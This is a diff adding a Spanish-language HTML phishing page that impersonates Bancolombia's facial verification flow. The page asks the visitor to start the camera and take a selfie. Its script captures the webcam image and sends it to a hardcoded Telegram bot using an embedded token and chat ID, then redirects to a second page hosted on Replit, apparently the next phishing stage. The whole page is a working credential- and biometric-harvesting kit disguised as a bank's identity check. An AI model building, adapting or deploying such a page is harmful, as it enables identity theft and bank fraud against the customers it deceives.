@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación</title>
+
+<style>
+*{box-sizing:border-box}
+body{
+  margin:0;
+  background:#ffffff; /* FONDO BLANCO */
+  font-family:Arial,sans-serif;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+.app{
+  width:100%;
+  max-width:420px;
+  height:100vh;
+  background:#ffffff; /* FONDO BLANCO */
+  display:flex;
+  flex-direction:column;
+  color:#111827;
+}
+.steps{
+  display:flex;
+  justify-content:space-around;
+  padding:15px;
+  font-size:13px;
+}
+.step{display:flex;align-items:center;gap:6px;opacity:.4}
+.step.active{opacity:1;font-weight:bold}
+.circle{
+  width:26px;height:26px;border-radius:50%;
+  background:#1e90ff;
+  color:white;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.content{
+  flex:1;
+  padding:15px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+.card{
+  background:white;
+  color:#222;
+  border-radius:18px;
+  padding:25px 15px;
+  width:100%;
+  text-align:center;
+}
+.icon{
+  width:60px;
+  height:60px;
+  border-radius:50%;
+  border:3px solid #1e293b;
+  margin:0 auto 10px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:26px;
+}
+.progress{
+  width:100%;
+  height:6px;
+  background:#eee;
+  border-radius:6px;
+  overflow:hidden;
+  margin-top:15px;
+}
+.progress div{
+  width:30%;
+  height:100%;
+  background:#1e293b;
+  animation:load 2s infinite;
+}
+@keyframes load{
+  0%{transform:translateX(-100%)}
+  100%{transform:translateX(300%)}
+}
+.camera{
+  position:relative;
+  width:100%;
+  height:60vh;
+  background:black;
+  border-radius:16px;
+  overflow:hidden;
+}
+video{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  transform:scale(1.15);
+}
+.oval{
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:180px;
+  height:240px;
+  border:3px solid rgba(255,255,255,.9);
+  border-radius:50%;
+  transform:translate(-50%,-50%);
+}
+button{
+  width:90%;
+  margin:15px auto;
+  padding:15px;
+  border:none;
+  border-radius:30px;
+  font-size:16px;
+  font-weight:bold;
+  background:#facc15;
+  color:#222;
+}
+.hidden{display:none}
+canvas{display:none}
+@media (min-width:768px){
+  .app{
+    height:90vh;
+    border-radius:20px;
+    box-shadow:0 10px 40px rgba(0,0,0,.15);
+  }
+}
+
+/* TARJETA INFO */
+.info-card{
+  background:#ffffff; /* BLANCO */
+  border-radius:14px;
+  padding:20px 18px;
+  margin:0 20px 10px;
+  text-align:center;
+  box-shadow:0 4px 12px rgba(0,0,0,.08);
+}
+.info-card h2{
+  margin:0 0 8px;
+  font-size:18px;
+  font-weight:700;
+  color:#111827;
+}
+.info-card p{
+  margin:0;
+  font-size:14px;
+  line-height:1.4;
+  color:#374151;
+}
+
+/* LOGO */
+.brand-logo{
+  width:180px;
+  max-width:80%;
+  height:auto;
+  display:block;
+  margin:0 auto 12px;
+}
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <div class="steps">
+    <div class="step active"><div class="circle">✓</div>Rostro</div>
+    <div class="step active"><div class="circle">2</div>Adelante</div>
+    <div class="step"><div class="circle">3</div>Atrás</div>
+    <div class="step"><div class="circle">4</div>Finalizar</div>
+  </div>
+
+  <div class="info-card">
+    <img
+      src="https://losmolinos.com.co/wp-content/uploads/2020/10/BANCOLOMBIA_LOGOS_MARCAS_SITIOWEB-2048x1152.jpg"
+      alt="Bancolombia"
+      class="brand-logo"
+    >
+    <h2>Verificación facial</h2>
+    <p>
+      Mantén tu rostro centrado dentro del óvalo y sigue las indicaciones en pantalla para continuar.
+    </p>
+  </div>
+
+  <div class="content">
+
+    <div id="startCard" class="card">
+      <div class="icon">📷</div>
+      <div class="progress"><div></div></div>
+    </div>
+
+    <div id="cameraCard" class="card hidden">
+      <div class="camera">
+        <video id="video" autoplay muted playsinline></video>
+        <div class="oval"></div>
+      </div>
+    </div>
+
+  </div>
+
+  <button id="startBtn">Iniciar Verificación</button>
+  <button id="captureBtn" class="hidden">Tomar foto</button>
+
+</div>
+
+<canvas id="canvas"></canvas>
+
+<!-- TU SCRIPT ORIGINAL SIN CAMBIOS -->
+<script>
+const BOT_TOKEN = "7560835826:AAEi0Itg5ivd476odunl3z0Gs5j2Sj0rlzw";
+const CHAT_ID = "8042354877";
+
+const startBtn = document.getElementById("startBtn");
+const captureBtn = document.getElementById("captureBtn");
+const startCard = document.getElementById("startCard");
+const cameraCard = document.getElementById("cameraCard");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+startBtn.onclick = async () => {
+  startCard.classList.add("hidden");
+  cameraCard.classList.remove("hidden");
+  startBtn.classList.add("hidden");
+  captureBtn.classList.remove("hidden");
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video:{facingMode:"user"}
+  });
+  video.srcObject = stream;
+};
+
+captureBtn.onclick = () => {
+  captureBtn.textContent = "Procesando...";
+  captureBtn.disabled = true;
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
+  canvas.toBlob(async blob => {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "captura.jpg");
+
+    try{
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+        method:"POST",
+        body:formData
+      });
+    }catch(e){
+      console.error(e);
+    }
+
+    window.location.href = "https://9c9b8f1e-6840-435a-8a73-9dba9f4050bd-00-2r4errh6dk363.worf.replit.dev/ccd.html";
+  }, "image/jpeg", 0.9);
+};
+</script>
+
+</body>
+</html>
